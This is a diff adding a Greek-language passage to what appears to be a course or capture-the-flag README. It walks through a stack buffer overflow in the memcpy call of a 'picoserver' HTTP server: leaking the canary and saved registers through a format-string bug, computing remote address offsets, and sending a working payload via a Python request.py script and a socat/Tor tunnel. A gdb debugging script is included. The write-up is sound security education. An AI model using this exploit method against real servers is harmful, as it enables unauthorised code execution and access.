@@ -132,5 +132,125 @@
  
 Για να ολοκληρωθεί το Plan X χρείάζεται ένας **ηλιακός  αναλυτής ανέμου**...
 
+## Ερώρημα 3
+
+Για να μάθουμε ποια ειναι τα results του "Plan Y" ακολουθήσαμε την παρακάτω διαδικασία:
+
+Παρατηρήσαμε ότι το input που δίναμε το έπαιρνε  η συνάρτηση **memcpy** για να το αντιγράψει στον πίνακα **post_data** και για μήκος χρησιμοποιούσε τo μήκος του input + 1 (payload_size + 1). Οπότε αν δίναμε είσοδο πάνω από 100 χαρακτήρες η memcpy θα έκανε πάνω από 100 αντιγραφές με αποτέλεσμα να μπορούμε να κάνουμε buffer overflow.
+
+Στη συνέχεια τρέξαμε τον server με gdb για δούμε την δομή της στοίβας στο frame της συνάρτησης **post_param**.
+
+Είδαμε ότι μετά τα 100 στοιχεία του buffer ήταν το **canary**, δυο ίδιες διευθύνσεις σταθερές, o **saved $ebp** και o **saved $eip**. Σκοπός μας ήταν να αλλάξουμε τη διεύθυνση του saved $eip και να κάνουμε την συνάρτηση post_param να επιστρέψει μεσα στο if(allowed) και να κληθεί η **serve_ultimate()**. Εν τέλη αποφασίσαμε να κάνουμε την post_param να επιστρέψει μέσα στην serve_ultimate.
+
+Για αρχή αλλάξαμε την τιμή του saved $eip από τον gdb, της δώσαμε την τιμή της διεύθυνσης εντολής **<serve_ultimate+18>** και πράγματι ο κώδικας συνέχισε να εκτελείται από την εκείνη την εντολή και μετά, δηλαδή μέσα στην συνάρτηση serve_ultimate με αποτέλεσμα να δούμε τα περιεχόμενα του αρχείου **ultimate.html**
+
+Για να γίνει το attack έπρεπε να κάνουμε ένα buffer στο οποίο όλα τα στοιχεία μετά τον buffer θα παραμείνουν ίδια εκτός από τον saved $eip. Για αυτό το λόγο έπρεπε να ξέρουμε την τιμή του canary, του  saved $ebp και τις 2 ενδιάμεσες διευθύνσεις (που ήταν ίσες) που είχαμε παρατηρήσει ότι παραμένανε σταθερές. 
+
+Χρησιμοποιήσαμε την vulnerable printf του ερωτήματος 2 και τυπώσαμε το frame της **check_auth**. 
+
+Το saved $ebp είναι το ίδιο γιατί γυρνάνε στην ίδια συνάρτηση (route) και το Canary ειναι επίσης το ίδιο για όλες τις συναρτήσεις του προγράμματος. 
+
+Παρατηρήσαμε επίσεις πως η μια από τις 2 ενδιάμεσες διευθύνσεις ήταν ίδια με τις 2 ενδιάμεσες διευθύνσεις του frame του post_param.
+
+Στη συνέχεια τυπώσαμε το frame της check_auth + την επόμενη διεύθυνση (saved $eip) από τον remote server, οπότε είχαμε το canary, την αντίστοιχη διεύθυνση της σταθερής διεύθυνσης που θέλαμε, τον saved $ebp και τον saved $eip, βρήκαμε και τον αντίστοιχο local saved $eip και τον αφαιρέσαμε από τον saved $eip του remote server, έτσι είχαμε το offset ανάμεσα στον local server και στον remote server. Προσθέσαμε αυτό το offset στην διεύθυνση της εντολής **<serve_ultimate+18>** και βρήκαμε την διεύθυνσή της στο remote server. Τέλος σχεδιάσαμε το input, το οποίο ήταν της μορφής:
+
+    'Α' * 100 + Canary + Constant address * 2 + Saved $ebp + <serve_ultimate+18> address
+
+Με αυτό το input, καταφέραμε να κάνουμε το exploit.
+
+Για να κάνουμε τις δοκιμές στον remote server, τρέξαμε την εντολή socat:
+
+    socat TCP4-LISTEN:8000,bind=127.0.0.1,fork SOCKS4A:localhost:4tpgiulwmoz4sphv.onion:80,socksport=9150
+
+εχοντας ανοικτό το tor service και στην συνέχεια εκτελέσαμε το script request.py για να κάνουμε το request.
+
+**request.py:**
+
+    import requests
+    
+    headers = {
+        'U': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:77.0) Gecko/20100101 Firefox/77.0',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': 'http://127.0.0.1:8000',
+        'Authorization': 'Basic YWRtaW46eW91IHNoYWxsIG5vdCBwYXNz',
+        'Connection': 'keep-alive',
+        'Referer': 'http://127.0.0.1:8000/',
+        'Upgrade-Insecure-Requests': '1',
+    }
+    
+    #canary = i.to_bytes(4, byteorder='little')
+    data = b'A' * 100               # <-- buffer
+    data += b'\x00\xe2\x4c\xe7'     # <-- canary
+    data += b'\x00\x70\x5c\x56'     # <-- canary
+    data += b'\x00\x70\x5c\x56'     # <-- canary
+    data += b'\x78\x58\x8e\xff'     # <-- saved $ebp
+    data += b'\x6d\x49\x5c\x56'     # <-- saved $eip
+    try:
+        response = requests.post('http://127.0.0.1:8000/ultimate.html', headers=headers, data=data)
+        status_code = response.status_code
+        print("status_code = [" + str(status_code) + "]")
+        print("text = [" + response.text+ "]")
+    except requests.exceptions.RequestException as e:
+        print(e)  
+Response:
+
+ > Results:
+> 
+> 41.99334111122333
+> 
+> Preliminary results, the answer is approximate. Our supercomputer is
+> working on it but it's taking forever.
+> 
+> The log is here: /var/log/z.log
+
+
+
+**debug.sh:**
+
+    #!/bin/sh
+    make
+    
+    PID=ps -eaf | grep picoserver | grep -v grep | awk '{print $2}'
+    
+    kill -9 $PID
+    
+    gdb\
+     -ex 'b httpd.c:58'\
+     -ex 'b main.c:179'\
+     -ex 'b main.c:181'\
+     -ex 'b main.c:194'\
+     -ex 'b main.c:197'\
+     -ex 'r'\
+     -ex 'set follow-fork-mode child'\
+     -ex 'c'\
+     -ex 'x/39xw $sp'\
+     -ex 'x/a $ebp + 4'\
+     ./picoserver
+
+**Χρήσιμες εντολές gdb:**
+Υπολογισμός του offset της διεύθυνσης του remote server σε σχέση με την διεύθυνση του local server:
+
+    call fprintf(stderr, "%p\n", [remote address] - [local address])
+
+Υπολογισμός του διεύθυνσης εντολής:
+
+    call fprintf(stderr, "%p\n", [local address of command] + offset)
+
+Επαλήθευση σωστής διεύθυνσης εντολής
+
+    x/a 0x0040190a
+
+Επανασύνδεση του gdb με την γονική διεργασία:
+
+    attach [PID]
+ 
+Υπολογισμός λέξεων που καταλαμβάνει το τρέχον frame:
+
+    p ($ebp - $esp) / 4 // <-- 40
+Εκτύπωση του τρέχον frame σε λέξεις:
+
+    x/40xw $sp
 
 Σημείωση: Τα python scripts είναι γραμμένα σε **python3**.
